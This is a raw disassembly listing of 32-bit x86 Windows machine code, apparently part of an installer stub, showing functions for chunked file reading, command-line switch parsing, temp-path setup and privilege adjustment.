  4032a3:	2b 35 68 b8 40 00    	sub    0x40b868,%esi
  4032a9:	57                   	push   %edi
  4032aa:	03 74 24 14          	add    0x14(%esp),%esi
  4032ae:	ff 15 e8 80 40 00    	call   *0x4080e8
  4032b4:	33 db                	xor    %ebx,%ebx
  4032b6:	05 f4 01 00 00       	add    $0x1f4,%eax
  4032bb:	3b f3                	cmp    %ebx,%esi
  4032bd:	a3 50 47 42 00       	mov    %eax,0x424750
  4032c2:	0f 8e 2a 01 00 00    	jle    0x4033f2
  4032c8:	ff 35 0c f9 41 00    	push   0x41f90c
  4032ce:	e8 46 01 00 00       	call   0x403419
  4032d3:	53                   	push   %ebx
  4032d4:	53                   	push   %ebx
  4032d5:	ff 35 68 b8 40 00    	push   0x40b868
  4032db:	ff 35 1c a0 40 00    	push   0x40a01c
  4032e1:	ff 15 50 81 40 00    	call   *0x408150
  4032e7:	89 35 08 f9 41 00    	mov    %esi,0x41f908
  4032ed:	89 1d f8 f8 41 00    	mov    %ebx,0x41f8f8
  4032f3:	bd f8 b8 40 00       	mov    $0x40b8f8,%ebp
  4032f8:	a1 00 f9 41 00       	mov    0x41f900,%eax
  4032fd:	bf 00 40 00 00       	mov    $0x4000,%edi
  403302:	2b 05 0c f9 41 00    	sub    0x41f90c,%eax
  403308:	3b c7                	cmp    %edi,%eax
  40330a:	7f 02                	jg     0x40330e
  40330c:	8b f8                	mov    %eax,%edi
  40330e:	be f8 38 41 00       	mov    $0x4138f8,%esi
  403313:	57                   	push   %edi
  403314:	56                   	push   %esi
  403315:	e8 e9 00 00 00       	call   0x403403
  40331a:	85 c0                	test   %eax,%eax
  40331c:	0f 84 c2 00 00 00    	je     0x4033e4
  403322:	01 3d 0c f9 41 00    	add    %edi,0x41f90c
  403328:	89 35 88 b8 40 00    	mov    %esi,0x40b888
  40332e:	89 3d 8c b8 40 00    	mov    %edi,0x40b88c
  403334:	39 1d 54 47 42 00    	cmp    %ebx,0x424754
  40333a:	74 29                	je     0x403365
  40333c:	39 1d 00 48 42 00    	cmp    %ebx,0x424800
  403342:	75 21                	jne    0x403365
  403344:	a1 08 f9 41 00       	mov    0x41f908,%eax
  403349:	53                   	push   %ebx
  40334a:	2b 05 fc f8 41 00    	sub    0x41f8fc,%eax
  403350:	2b 44 24 18          	sub    0x18(%esp),%eax
  403354:	03 05 68 b8 40 00    	add    0x40b868,%eax
  40335a:	a3 f8 f8 41 00       	mov    %eax,0x41f8f8
  40335f:	e8 ee fa ff ff       	call   0x402e52
  403364:	59                   	pop    %ecx
  403365:	b9 70 b8 40 00       	mov    $0x40b870,%ecx
  40336a:	89 2d 90 b8 40 00    	mov    %ebp,0x40b890
  403370:	c7 05 94 b8 40 00 00 	movl   $0x8000,0x40b894
  403377:	80 00 00 
  40337a:	e8 f7 33 00 00       	call   0x406776
  40337f:	85 c0                	test   %eax,%eax
  403381:	7c 6a                	jl     0x4033ed
  403383:	8b 35 90 b8 40 00    	mov    0x40b890,%esi
  403389:	2b f5                	sub    %ebp,%esi
  40338b:	74 21                	je     0x4033ae
  40338d:	56                   	push   %esi
  40338e:	55                   	push   %ebp
  40338f:	ff 35 1c a0 40 00    	push   0x40a01c
  403395:	e8 ce 2a 00 00       	call   0x405e68
  40339a:	85 c0                	test   %eax,%eax
  40339c:	74 4b                	je     0x4033e9
  40339e:	01 35 68 b8 40 00    	add    %esi,0x40b868
  4033a4:	39 1d 8c b8 40 00    	cmp    %ebx,0x40b88c
  4033aa:	75 88                	jne    0x403334
  4033ac:	eb 0c                	jmp    0x4033ba
  4033ae:	39 1d 8c b8 40 00    	cmp    %ebx,0x40b88c
  4033b4:	75 37                	jne    0x4033ed
  4033b6:	3b fb                	cmp    %ebx,%edi
  4033b8:	74 33                	je     0x4033ed
  4033ba:	a1 fc f8 41 00       	mov    0x41f8fc,%eax
  4033bf:	8b c8                	mov    %eax,%ecx
  4033c1:	2b 0d 68 b8 40 00    	sub    0x40b868,%ecx
  4033c7:	03 4c 24 14          	add    0x14(%esp),%ecx
  4033cb:	85 c9                	test   %ecx,%ecx
  4033cd:	0f 8f 25 ff ff ff    	jg     0x4032f8
  4033d3:	53                   	push   %ebx
  4033d4:	53                   	push   %ebx
  4033d5:	50                   	push   %eax
  4033d6:	ff 35 1c a0 40 00    	push   0x40a01c
  4033dc:	ff 15 50 81 40 00    	call   *0x408150
  4033e2:	eb 0e                	jmp    0x4033f2
  4033e4:	83 c8 ff             	or     $0xffffffff,%eax
  4033e7:	eb 13                	jmp    0x4033fc
  4033e9:	6a fe                	push   $0xfffffffe
  4033eb:	eb 02                	jmp    0x4033ef
  4033ed:	6a fd                	push   $0xfffffffd
  4033ef:	58                   	pop    %eax
  4033f0:	eb 0a                	jmp    0x4033fc
  4033f2:	6a 01                	push   $0x1
  4033f4:	e8 59 fa ff ff       	call   0x402e52
  4033f9:	59                   	pop    %ecx
  4033fa:	33 c0                	xor    %eax,%eax
  4033fc:	5f                   	pop    %edi
  4033fd:	5e                   	pop    %esi
  4033fe:	5d                   	pop    %ebp
  4033ff:	5b                   	pop    %ebx
  403400:	c2 04 00             	ret    $0x4
  403403:	ff 74 24 08          	push   0x8(%esp)
  403407:	ff 74 24 08          	push   0x8(%esp)
  40340b:	ff 35 18 a0 40 00    	push   0x40a018
  403411:	e8 23 2a 00 00       	call   0x405e39
  403416:	c2 08 00             	ret    $0x8
  403419:	6a 00                	push   $0x0
  40341b:	6a 00                	push   $0x0
  40341d:	ff 74 24 0c          	push   0xc(%esp)
  403421:	ff 35 18 a0 40 00    	push   0x40a018
  403427:	ff 15 50 81 40 00    	call   *0x408150
  40342d:	c2 04 00             	ret    $0x4
  403430:	56                   	push   %esi
  403431:	be 00 b4 42 00       	mov    $0x42b400,%esi
  403436:	56                   	push   %esi
  403437:	e8 c7 30 00 00       	call   0x406503
  40343c:	56                   	push   %esi
  40343d:	e8 eb 27 00 00       	call   0x405c2d
  403442:	85 c0                	test   %eax,%eax
  403444:	75 02                	jne    0x403448
  403446:	5e                   	pop    %esi
  403447:	c3                   	ret
  403448:	56                   	push   %esi
  403449:	e8 72 27 00 00       	call   0x405bc0
  40344e:	56                   	push   %esi
  40344f:	e8 3e 24 00 00       	call   0x405892
  403454:	56                   	push   %esi
  403455:	68 00 b0 42 00       	push   $0x42b000
  40345a:	e8 91 29 00 00       	call   0x405df0
  40345f:	5e                   	pop    %esi
  403460:	c3                   	ret
  403461:	81 ec 84 01 00 00    	sub    $0x184,%esp
  403467:	53                   	push   %ebx
  403468:	56                   	push   %esi
  403469:	57                   	push   %edi
  40346a:	33 db                	xor    %ebx,%ebx
  40346c:	68 01 80 00 00       	push   $0x8001
  403471:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403475:	c7 44 24 10 30 a1 40 	movl   $0x40a130,0x10(%esp)
  40347c:	00 
  40347d:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403481:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  403486:	ff 15 b0 80 40 00    	call   *0x4080b0
  40348c:	ff 15 c0 80 40 00    	call   *0x4080c0
  403492:	25 ff ff ff bf       	and    $0xbfffffff,%eax
  403497:	66 3d 06 00          	cmp    $0x6,%ax
  40349b:	a3 4c 47 42 00       	mov    %eax,0x42474c
  4034a0:	74 11                	je     0x4034b3
  4034a2:	53                   	push   %ebx
  4034a3:	e8 89 31 00 00       	call   0x406631
  4034a8:	3b c3                	cmp    %ebx,%eax
  4034aa:	74 07                	je     0x4034b3
  4034ac:	68 00 0c 00 00       	push   $0xc00
  4034b1:	ff d0                	call   *%eax
  4034b3:	be a0 82 40 00       	mov    $0x4082a0,%esi
  4034b8:	56                   	push   %esi
  4034b9:	e8 05 31 00 00       	call   0x4065c3
  4034be:	56                   	push   %esi
  4034bf:	ff 15 b8 80 40 00    	call   *0x4080b8
  4034c5:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4034c9:	38 1e                	cmp    %bl,(%esi)
  4034cb:	75 eb                	jne    0x4034b8
  4034cd:	6a 0b                	push   $0xb
  4034cf:	e8 5d 31 00 00       	call   0x406631
  4034d4:	6a 09                	push   $0x9
  4034d6:	e8 56 31 00 00       	call   0x406631
  4034db:	6a 07                	push   $0x7
  4034dd:	a3 44 47 42 00       	mov    %eax,0x424744
  4034e2:	e8 4a 31 00 00       	call   0x406631
  4034e7:	3b c3                	cmp    %ebx,%eax
  4034e9:	74 0f                	je     0x4034fa
  4034eb:	6a 1e                	push   $0x1e
  4034ed:	ff d0                	call   *%eax
  4034ef:	85 c0                	test   %eax,%eax
  4034f1:	74 07                	je     0x4034fa
  4034f3:	80 0d 4f 47 42 00 40 	orb    $0x40,0x42474f
  4034fa:	55                   	push   %ebp
  4034fb:	ff 15 38 80 40 00    	call   *0x408038
  403501:	53                   	push   %ebx
  403502:	ff 15 88 82 40 00    	call   *0x408288
  403508:	a3 18 48 42 00       	mov    %eax,0x424818
  40350d:	53                   	push   %ebx
  40350e:	8d 44 24 38          	lea    0x38(%esp),%eax
  403512:	68 60 01 00 00       	push   $0x160
  403517:	50                   	push   %eax
  403518:	53                   	push   %ebx
  403519:	68 10 fd 41 00       	push   $0x41fd10
  40351e:	ff 15 6c 81 40 00    	call   *0x40816c
  403524:	68 ec a1 40 00       	push   $0x40a1ec
  403529:	68 40 3f 42 00       	push   $0x423f40
  40352e:	e8 f5 2c 00 00       	call   0x406228
  403533:	ff 15 bc 80 40 00    	call   *0x4080bc
  403539:	bd 00 a0 42 00       	mov    $0x42a000,%ebp
  40353e:	50                   	push   %eax
  40353f:	55                   	push   %ebp
  403540:	e8 e3 2c 00 00       	call   0x406228
  403545:	80 3d 00 a0 42 00 22 	cmpb   $0x22,0x42a000
  40354c:	c7 05 40 47 42 00 00 	movl   $0x400000,0x424740
  403553:	00 40 00 
  403556:	8b c5                	mov    %ebp,%eax
  403558:	75 0a                	jne    0x403564
  40355a:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  40355f:	b8 01 a0 42 00       	mov    $0x42a001,%eax
  403564:	ff 74 24 14          	push   0x14(%esp)
  403568:	50                   	push   %eax
  403569:	e8 7d 26 00 00       	call   0x405beb
  40356e:	50                   	push   %eax
  40356f:	ff 15 10 82 40 00    	call   *0x408210
  403575:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403579:	e9 c0 00 00 00       	jmp    0x40363e
  40357e:	80 f9 20             	cmp    $0x20,%cl
  403581:	75 06                	jne    0x403589
  403583:	40                   	inc    %eax
  403584:	80 38 20             	cmpb   $0x20,(%eax)
  403587:	74 fa                	je     0x403583
  403589:	80 38 22             	cmpb   $0x22,(%eax)
  40358c:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  403591:	75 06                	jne    0x403599
  403593:	40                   	inc    %eax
  403594:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  403599:	80 38 2f             	cmpb   $0x2f,(%eax)
  40359c:	0f 85 8c 00 00 00    	jne    0x40362e
  4035a2:	40                   	inc    %eax
  4035a3:	80 38 53             	cmpb   $0x53,(%eax)
  4035a6:	75 16                	jne    0x4035be
  4035a8:	8a 48 01             	mov    0x1(%eax),%cl
  4035ab:	80 f9 20             	cmp    $0x20,%cl
  4035ae:	74 04                	je     0x4035b4
  4035b0:	3a cb                	cmp    %bl,%cl
  4035b2:	75 0a                	jne    0x4035be
  4035b4:	c7 05 00 48 42 00 01 	movl   $0x1,0x424800
  4035bb:	00 00 00 
  4035be:	0f be 0d e7 a1 40 00 	movsbl 0x40a1e7,%ecx
  4035c5:	0f be 15 e6 a1 40 00 	movsbl 0x40a1e6,%edx
  4035cc:	c1 e1 08             	shl    $0x8,%ecx
  4035cf:	0b ca                	or     %edx,%ecx
  4035d1:	0f be 15 e5 a1 40 00 	movsbl 0x40a1e5,%edx
  4035d8:	c1 e1 08             	shl    $0x8,%ecx
  4035db:	0b ca                	or     %edx,%ecx
  4035dd:	0f be 15 e4 a1 40 00 	movsbl 0x40a1e4,%edx
  4035e4:	c1 e1 08             	shl    $0x8,%ecx
  4035e7:	0b ca                	or     %edx,%ecx
  4035e9:	39 08                	cmp    %ecx,(%eax)
  4035eb:	75 11                	jne    0x4035fe
  4035ed:	8a 48 04             	mov    0x4(%eax),%cl
  4035f0:	80 f9 20             	cmp    $0x20,%cl
  4035f3:	74 04                	je     0x4035f9
  4035f5:	3a cb                	cmp    %bl,%cl
  4035f7:	75 05                	jne    0x4035fe
  4035f9:	83 4c 24 20 04       	orl    $0x4,0x20(%esp)
  4035fe:	0f be 0d df a1 40 00 	movsbl 0x40a1df,%ecx
  403605:	0f be 15 de a1 40 00 	movsbl 0x40a1de,%edx
  40360c:	c1 e1 08             	shl    $0x8,%ecx
  40360f:	0b ca                	or     %edx,%ecx
  403611:	0f be 15 dd a1 40 00 	movsbl 0x40a1dd,%edx
  403618:	c1 e1 08             	shl    $0x8,%ecx
  40361b:	0b ca                	or     %edx,%ecx
  40361d:	0f be 15 dc a1 40 00 	movsbl 0x40a1dc,%edx
  403624:	c1 e1 08             	shl    $0x8,%ecx
  403627:	0b ca                	or     %edx,%ecx
  403629:	39 48 fe             	cmp    %ecx,-0x2(%eax)
  40362c:	74 1c                	je     0x40364a
  40362e:	ff 74 24 14          	push   0x14(%esp)
  403632:	50                   	push   %eax
  403633:	e8 b3 25 00 00       	call   0x405beb
  403638:	80 38 22             	cmpb   $0x22,(%eax)
  40363b:	75 01                	jne    0x40363e
  40363d:	40                   	inc    %eax
  40363e:	8a 08                	mov    (%eax),%cl
  403640:	3a cb                	cmp    %bl,%cl
  403642:	0f 85 36 ff ff ff    	jne    0x40357e
  403648:	eb 11                	jmp    0x40365b
  40364a:	88 58 fe             	mov    %bl,-0x2(%eax)
  40364d:	83 c0 02             	add    $0x2,%eax
  403650:	50                   	push   %eax
  403651:	68 00 a4 42 00       	push   $0x42a400
  403656:	e8 cd 2b 00 00       	call   0x406228
  40365b:	8b 3d cc 80 40 00    	mov    0x4080cc,%edi
  403661:	be 00 b4 42 00       	mov    $0x42b400,%esi
  403666:	56                   	push   %esi
  403667:	68 00 04 00 00       	push   $0x400
  40366c:	ff d7                	call   *%edi
  40366e:	e8 bd fd ff ff       	call   0x403430
  403673:	85 c0                	test   %eax,%eax
  403675:	75 56                	jne    0x4036cd
  403677:	68 fb 03 00 00       	push   $0x3fb
  40367c:	56                   	push   %esi
  40367d:	ff 15 c4 80 40 00    	call   *0x4080c4
  403683:	68 d4 a1 40 00       	push   $0x40a1d4
  403688:	56                   	push   %esi
  403689:	e8 b6 2b 00 00       	call   0x406244
  40368e:	e8 9d fd ff ff       	call   0x403430
  403693:	85 c0                	test   %eax,%eax
  403695:	75 36                	jne    0x4036cd
  403697:	56                   	push   %esi
  403698:	68 fc 03 00 00       	push   $0x3fc
  40369d:	ff d7                	call   *%edi
  40369f:	68 d0 a1 40 00       	push   $0x40a1d0
  4036a4:	56                   	push   %esi
  4036a5:	e8 9a 2b 00 00       	call   0x406244
  4036aa:	8b 3d c8 80 40 00    	mov    0x4080c8,%edi
  4036b0:	56                   	push   %esi
  4036b1:	68 c8 a1 40 00       	push   $0x40a1c8
  4036b6:	ff d7                	call   *%edi
  4036b8:	56                   	push   %esi
  4036b9:	68 c4 a1 40 00       	push   $0x40a1c4
  4036be:	ff d7                	call   *%edi
  4036c0:	e8 6b fd ff ff       	call   0x403430
  4036c5:	85 c0                	test   %eax,%eax
  4036c7:	0f 84 ae 00 00 00    	je     0x40377b
  4036cd:	68 00 b0 42 00       	push   $0x42b000
  4036d2:	ff 15 60 81 40 00    	call   *0x408160
  4036d8:	ff 74 24 20          	push   0x20(%esp)
  4036dc:	e8 10 f8 ff ff       	call   0x402ef1
  4036e1:	3b c3                	cmp    %ebx,%eax
  4036e3:	89 44 24 10          	mov    %eax,0x10(%esp)
  4036e7:	0f 85 8e 00 00 00    	jne    0x40377b
  4036ed:	39 1d 60 47 42 00    	cmp    %ebx,0x424760
  4036f3:	74 76                	je     0x40376b
  4036f5:	53                   	push   %ebx
  4036f6:	55                   	push   %ebp
  4036f7:	e8 ef 24 00 00       	call   0x405beb
  4036fc:	8b f8                	mov    %eax,%edi
  4036fe:	3b fd                	cmp    %ebp,%edi
  403700:	72 34                	jb     0x403736
  403702:	0f be 05 bf a1 40 00 	movsbl 0x40a1bf,%eax
  403709:	0f be 0d be a1 40 00 	movsbl 0x40a1be,%ecx
  403710:	c1 e0 08             	shl    $0x8,%eax
  403713:	0b c1                	or     %ecx,%eax
  403715:	0f be 0d bd a1 40 00 	movsbl 0x40a1bd,%ecx
  40371c:	c1 e0 08             	shl    $0x8,%eax
  40371f:	0b c1                	or     %ecx,%eax
  403721:	0f be 0d bc a1 40 00 	movsbl 0x40a1bc,%ecx
  403728:	c1 e0 08             	shl    $0x8,%eax
  40372b:	0b c1                	or     %ecx,%eax
  40372d:	39 07                	cmp    %eax,(%edi)
  40372f:	74 05                	je     0x403736
  403731:	4f                   	dec    %edi
  403732:	3b fd                	cmp    %ebp,%edi
  403734:	73 f7                	jae    0x40372d
  403736:	3b fd                	cmp    %ebp,%edi
  403738:	c7 44 24 10 74 a1 40 	movl   $0x40a174,0x10(%esp)
  40373f:	00 
  403740:	72 65                	jb     0x4037a7
  403742:	88 1f                	mov    %bl,(%edi)
  403744:	83 c7 04             	add    $0x4,%edi
  403747:	57                   	push   %edi
  403748:	e8 61 25 00 00       	call   0x405cae
  40374d:	85 c0                	test   %eax,%eax
  40374f:	74 2a                	je     0x40377b
  403751:	57                   	push   %edi
  403752:	68 00 a4 42 00       	push   $0x42a400
  403757:	e8 cc 2a 00 00       	call   0x406228
  40375c:	57                   	push   %edi
  40375d:	68 00 a8 42 00       	push   $0x42a800
  403762:	e8 c1 2a 00 00       	call   0x406228
  403767:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40376b:	83 0d 0c 48 42 00 ff 	orl    $0xffffffff,0x42480c
  403772:	e8 c4 02 00 00       	call   0x403a3b
  403777:	89 44 24 18          	mov    %eax,0x18(%esp)
  40377b:	e8 c9 01 00 00       	call   0x403949
  403780:	ff 15 8c 82 40 00    	call   *0x40828c
  403786:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40378a:	5d                   	pop    %ebp
  40378b:	0f 84 1e 01 00 00    	je     0x4038af
  403791:	68 10 00 20 00       	push   $0x200010
  403796:	ff 74 24 10          	push   0x10(%esp)
  40379a:	e8 a5 21 00 00       	call   0x405944
  40379f:	6a 02                	push   $0x2
  4037a1:	ff 15 d8 80 40 00    	call   *0x4080d8
  4037a7:	e8 03 21 00 00       	call   0x4058af
  4037ac:	68 b4 a1 40 00       	push   $0x40a1b4
  4037b1:	56                   	push   %esi
  4037b2:	8b f8                	mov    %eax,%edi
  4037b4:	e8 8b 2a 00 00       	call   0x406244
  4037b9:	3b fb                	cmp    %ebx,%edi
  4037bb:	74 0b                	je     0x4037c8
  4037bd:	68 b0 a1 40 00       	push   $0x40a1b0
  4037c2:	56                   	push   %esi
  4037c3:	e8 7c 2a 00 00       	call   0x406244
  4037c8:	68 a8 a1 40 00       	push   $0x40a1a8
  4037cd:	56                   	push   %esi
  4037ce:	e8 71 2a 00 00       	call   0x406244
  4037d3:	bd 00 ac 42 00       	mov    $0x42ac00,%ebp
  4037d8:	55                   	push   %ebp
  4037d9:	56                   	push   %esi
  4037da:	ff 15 18 81 40 00    	call   *0x408118
  4037e0:	85 c0                	test   %eax,%eax
  4037e2:	74 97                	je     0x40377b
  4037e4:	3b fb                	cmp    %ebx,%edi
  4037e6:	56                   	push   %esi
  4037e7:	74 07                	je     0x4037f0
  4037e9:	e8 27 20 00 00       	call   0x405815
  4037ee:	eb 05                	jmp    0x4037f5
  4037f0:	e8 9d 20 00 00       	call   0x405892
  4037f5:	56                   	push   %esi
  4037f6:	ff 15 f8 80 40 00    	call   *0x4080f8
  4037fc:	38 1d 00 a4 42 00    	cmp    %bl,0x42a400
  403802:	75 0b                	jne    0x40380f
  403804:	55                   	push   %ebp
  403805:	68 00 a4 42 00       	push   $0x42a400
  40380a:	e8 19 2a 00 00       	call   0x406228
  40380f:	ff 74 24 1c          	push   0x1c(%esp)
  403813:	68 00 50 42 00       	push   $0x425000
  403818:	e8 0b 2a 00 00       	call   0x406228
  40381d:	66 0f be 0d a4 a1 40 	movsbw 0x40a1a4,%cx
  403824:	00 
  403825:	33 c0                	xor    %eax,%eax
  403827:	6a 1a                	push   $0x1a
  403829:	8a 25 a5 a1 40 00    	mov    0x40a1a5,%ah
  40382f:	5d                   	pop    %ebp
  403830:	0b c1                	or     %ecx,%eax
  403832:	bf 10 f9 41 00       	mov    $0x41f910,%edi
  403837:	66 a3 00 54 42 00    	mov    %ax,0x425400
  40383d:	a1 54 47 42 00       	mov    0x424754,%eax
  403842:	ff b0 20 01 00 00    	push   0x120(%eax)
  403848:	57                   	push   %edi
  403849:	e8 6d 2a 00 00       	call   0x4062bb
  40384e:	57                   	push   %edi
  40384f:	ff 15 60 81 40 00    	call   *0x408160
  403855:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  403859:	74 3f                	je     0x40389a
  40385b:	6a 01                	push   $0x1
  40385d:	57                   	push   %edi
  40385e:	68 00 bc 42 00       	push   $0x42bc00
  403863:	ff 15 d0 80 40 00    	call   *0x4080d0
  403869:	85 c0                	test   %eax,%eax
  40386b:	74 2d                	je     0x40389a
  40386d:	53                   	push   %ebx
  40386e:	57                   	push   %edi
  40386f:	e8 93 27 00 00       	call   0x406007
  403874:	a1 54 47 42 00       	mov    0x424754,%eax
  403879:	ff b0 24 01 00 00    	push   0x124(%eax)
  40387f:	57                   	push   %edi
  403880:	e8 36 2a 00 00       	call   0x4062bb
  403885:	57                   	push   %edi
  403886:	e8 3c 20 00 00       	call   0x4058c7
  40388b:	3b c3                	cmp    %ebx,%eax
  40388d:	74 0b                	je     0x40389a
  40388f:	50                   	push   %eax
  403890:	ff 15 20 81 40 00    	call   *0x408120
  403896:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40389a:	fe 05 00 54 42 00    	incb   0x425400
  4038a0:	4d                   	dec    %ebp
  4038a1:	75 9a                	jne    0x40383d
  4038a3:	53                   	push   %ebx
  4038a4:	56                   	push   %esi
  4038a5:	e8 5d 27 00 00       	call   0x406007
  4038aa:	e9 cc fe ff ff       	jmp    0x40377b
  4038af:	39 1d f4 47 42 00    	cmp    %ebx,0x4247f4
  4038b5:	74 7a                	je     0x403931
  4038b7:	8d 44 24 18          	lea    0x18(%esp),%eax
  4038bb:	50                   	push   %eax
  4038bc:	6a 28                	push   $0x28
  4038be:	ff 15 d4 80 40 00    	call   *0x4080d4
  4038c4:	50                   	push   %eax
  4038c5:	ff 15 24 80 40 00    	call   *0x408024
  4038cb:	6a 02                	push   $0x2
  4038cd:	85 c0                	test   %eax,%eax
  4038cf:	5f                   	pop    %edi
  4038d0:	74 30                	je     0x403902
  4038d2:	8d 44 24 24          	lea    0x24(%esp),%eax
  4038d6:	50                   	push   %eax
  4038d7:	68 90 a1 40 00       	push   $0x40a190
  4038dc:	53                   	push   %ebx
  4038dd:	ff 15 20 80 40 00    	call   *0x408020
  4038e3:	53                   	push   %ebx
  4038e4:	53                   	push   %ebx
  4038e5:	8d 44 24 28          	lea    0x28(%esp),%eax
  4038e9:	53                   	push   %ebx
  4038ea:	50                   	push   %eax
  4038eb:	53                   	push   %ebx
  4038ec:	ff 74 24 2c          	push   0x2c(%esp)
  4038f0:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  4038f7:	00 
  4038f8:	89 7c 24 44          	mov    %edi,0x44(%esp)
  4038fc:	ff 15 1c 80 40 00    	call   *0x40801c
  403902:	6a 04                	push   $0x4
  403904:	e8 28 2d 00 00       	call   0x406631
  403909:	3b c3                	cmp    %ebx,%eax
  40390b:	be 02 00 04 80       	mov    $0x80040002,%esi
  403910:	74 0c                	je     0x40391e
  403912:	56                   	push   %esi
  403913:	6a 25                	push   $0x25
  403915:	53                   	push   %ebx
  403916:	53                   	push   %ebx
  403917:	53                   	push   %ebx
  403918:	ff d0                	call   *%eax
  40391a:	85 c0                	test   %eax,%eax
  40391c:	74 0c                	je     0x40392a
  40391e:	56                   	push   %esi
  40391f:	57                   	push   %edi
  403920:	ff 15 08 82 40 00    	call   *0x408208
  403926:	85 c0                	test   %eax,%eax
  403928:	75 07                	jne    0x403931
  40392a:	6a 09                	push   $0x9
  40392c:	e8 da da ff ff       	call   0x40140b
  403931:	a1 0c 48 42 00       	mov    0x42480c,%eax
  403936:	83 f8 ff             	cmp    $0xffffffff,%eax
  403939:	74 04                	je     0x40393f
  40393b:	89 44 24 14          	mov    %eax,0x14(%esp)
  40393f:	ff 74 24 14          	push   0x14(%esp)
  403943:	ff 15 d8 80 40 00    	call   *0x4080d8
  403949:	a1 18 a0 40 00       	mov    0x40a018,%eax
  40394e:	56                   	push   %esi
  40394f:	8b 35 20 81 40 00    	mov    0x408120,%esi
  403955:	83 f8 ff             	cmp    $0xffffffff,%eax
  403958:	74 0a                	je     0x403964
  40395a:	50                   	push   %eax
  40395b:	ff d6                	call   *%esi
  40395d:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403964:	a1 1c a0 40 00       	mov    0x40a01c,%eax
  403969:	83 f8 ff             	cmp    $0xffffffff,%eax
  40396c:	74 0a                	je     0x403978
  40396e:	50                   	push   %eax
  40396f:	ff d6                	call   *%esi
  403971:	83 0d 1c a0 40 00 ff 	orl    $0xffffffff,0x40a01c
  403978:	e8 29 00 00 00       	call   0x4039a6
  40397d:	6a 07                	push   $0x7
  40397f:	68 00 b8 42 00       	push   $0x42b800
  403984:	e8 67 20 00 00       	call   0x4059f0
  403989:	5e                   	pop    %esi
  40398a:	c3                   	ret
  40398b:	56                   	push   %esi
  40398c:	8b 35 14 fd 41 00    	mov    0x41fd14,%esi
  403992:	eb 0a                	jmp    0x40399e
  403994:	ff 74 24 08          	push   0x8(%esp)
  403998:	ff 56 04             	call   *0x4(%esi)
  40399b:	8b 36                	mov    (%esi),%esi
  40399d:	59                   	pop    %ecx
  40399e:	85 f6                	test   %esi,%esi
  4039a0:	75 f2                	jne    0x403994
  4039a2:	5e                   	pop    %esi
  4039a3:	c2 04 00             	ret    $0x4
  4039a6:	56                   	push   %esi
  4039a7:	8b 35 14 fd 41 00    	mov    0x41fd14,%esi
  4039ad:	6a 00                	push   $0x0
  4039af:	e8 d7 ff ff ff       	call   0x40398b
  4039b4:	85 f6                	test   %esi,%esi
  4039b6:	74 1a                	je     0x4039d2
  4039b8:	57                   	push   %edi
  4039b9:	8b fe                	mov    %esi,%edi
  4039bb:	8b 36                	mov    (%esi),%esi
  4039bd:	ff 77 08             	push   0x8(%edi)
  4039c0:	ff 15 34 81 40 00    	call   *0x408134
  4039c6:	57                   	push   %edi
  4039c7:	ff 15 24 81 40 00    	call   *0x408124
  4039cd:	85 f6                	test   %esi,%esi
  4039cf:	75 e8                	jne    0x4039b9
  4039d1:	5f                   	pop    %edi
  4039d2:	83 25 14 fd 41 00 00 	andl   $0x0,0x41fd14
  4039d9:	5e                   	pop    %esi
  4039da:	c3                   	ret
  4039db:	a1 14 fd 41 00       	mov    0x41fd14,%eax
  4039e0:	eb 0b                	jmp    0x4039ed
  4039e2:	8b 48 08             	mov    0x8(%eax),%ecx
  4039e5:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  4039e9:	74 0a                	je     0x4039f5
  4039eb:	8b 00                	mov    (%eax),%eax
  4039ed:	85 c0                	test   %eax,%eax
  4039ef:	75 f1                	jne    0x4039e2
  4039f1:	40                   	inc    %eax
  4039f2:	c2 04 00             	ret    $0x4
  4039f5:	33 c0                	xor    %eax,%eax
  4039f7:	eb f9                	jmp    0x4039f2
  4039f9:	56                   	push   %esi
  4039fa:	8b 74 24 08          	mov    0x8(%esp),%esi
  4039fe:	56                   	push   %esi
  4039ff:	e8 d7 ff ff ff       	call   0x4039db
  403a04:	85 c0                	test   %eax,%eax
  403a06:	75 03                	jne    0x403a0b
  403a08:	40                   	inc    %eax
  403a09:	eb 2c                	jmp    0x403a37
  403a0b:	6a 0c                	push   $0xc
  403a0d:	6a 40                	push   $0x40
  403a0f:	ff 15 28 81 40 00    	call   *0x408128
  403a15:	85 c0                	test   %eax,%eax
  403a17:	74 1b                	je     0x403a34
  403a19:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403a1d:	89 70 08             	mov    %esi,0x8(%eax)
  403a20:	89 48 04             	mov    %ecx,0x4(%eax)
  403a23:	8b 0d 14 fd 41 00    	mov    0x41fd14,%ecx
  403a29:	89 08                	mov    %ecx,(%eax)
  403a2b:	a3 14 fd 41 00       	mov    %eax,0x41fd14
  403a30:	33 c0                	xor    %eax,%eax
  403a32:	eb 03                	jmp    0x403a37
  403a34:	83 c8 ff             	or     $0xffffffff,%eax
  403a37:	5e                   	pop    %esi
  403a38:	c2 08 00             	ret    $0x8
  403a3b:	83 ec 10             	sub    $0x10,%esp
  403a3e:	53                   	push   %ebx
  403a3f:	55                   	push   %ebp
  403a40:	56                   	push   %esi
  403a41:	8b 35 54 47 42 00    	mov    0x424754,%esi
  403a47:	57                   	push   %edi
  403a48:	6a 02                	push   $0x2
  403a4a:	e8 e2 2b 00 00       	call   0x406631
  403a4f:	33 db                	xor    %ebx,%ebx
  403a51:	3b c3                	cmp    %ebx,%eax
  403a53:	74 12                	je     0x403a67
  403a55:	ff d0                	call   *%eax
  403a57:	0f b7 c0             	movzwl %ax,%eax
  403a5a:	50                   	push   %eax
  403a5b:	68 00 b0 42 00       	push   $0x42b000
  403a60:	e8 21 27 00 00       	call   0x406186
  403a65:	eb 54                	jmp    0x403abb
  403a67:	bf 50 0d 42 00       	mov    $0x420d50,%edi
